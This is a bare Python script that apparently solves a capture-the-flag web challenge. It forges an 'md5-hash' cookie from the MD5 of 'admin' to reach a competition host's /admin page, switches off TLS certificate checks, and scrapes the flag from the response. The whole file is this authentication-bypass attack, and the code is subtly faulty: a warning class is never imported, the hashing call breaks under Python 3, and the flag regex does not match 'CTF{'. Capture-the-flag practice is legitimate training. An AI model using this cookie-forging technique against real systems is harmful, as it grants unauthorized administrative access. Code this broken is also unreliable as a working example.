#!/usr/bin/env python

import requests;
import hashlib;
import re;

def main():
#{
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning);
    username = 'admin';
    md5 = hashlib.md5();
    md5.update(username);
    md5_hash = md5.hexdigest();
    print(md5_hash);
    
    s = requests.Session();
    s.cookies.update({'md5-hash': md5_hash});
    r = s.get('https://ernst-echidna.ctfcompetition.com/admin', verify=False);
    content = r.text
    
    matched = re.search('CT{(.*)}', content);
    if matched:
    #{
        print(matched.group());
    #}
#}

if(__name__ == "__main__"):
#{
    main();
#}